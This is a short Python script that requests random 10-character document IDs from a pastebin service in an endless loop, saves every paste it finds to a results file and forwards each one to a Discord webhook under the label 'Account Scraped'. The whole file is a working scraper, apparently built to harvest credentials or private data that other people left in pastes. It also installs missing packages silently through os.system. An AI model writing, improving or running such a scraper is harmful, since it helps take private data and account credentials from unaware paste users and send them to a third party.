import os
try:
    from random import choice
    from string import ascii_letters
    from threading import Thread
    from dhooks.client import Webhook
    import colorama
    import requests
except ModuleNotFoundError:
    os.system("pip install dhooks colorama requests")
    
colorama.init()




class Main(Thread):
    def __init__(self):
        self.randstr = lambda length: ''.join(choice(ascii_letters) for _ in range(length))
        self.webhook = ""
        super().__init__(daemon=True)

    def run(self) -> None:
        while True:
            String = self.randstr(10)
            with requests.get(f"http://bin.shortbin.eu:8080/documents/{String}") as Request:
                if Request.status_code != 200:
                    print(f"{colorama.Fore.RED}[-]  {String}")
                    continue

                data = Request.json()["data"]
                print(f"{colorama.Fore.LIGHTGREEN_EX}[+]  {data}")
                
                if self.webhook != "":
                    try:
                        hook = Webhook(self.webhook)
                        hook.send(f"Account Scraped: `{data}`")
                    except:
                        pass
                else:
                    pass

                with open("results.txt", "a+") as f:
                    f.write(data + "\n")


for _ in range(1): # 1 is Thread
    Main().start()
while True:
    input()
 
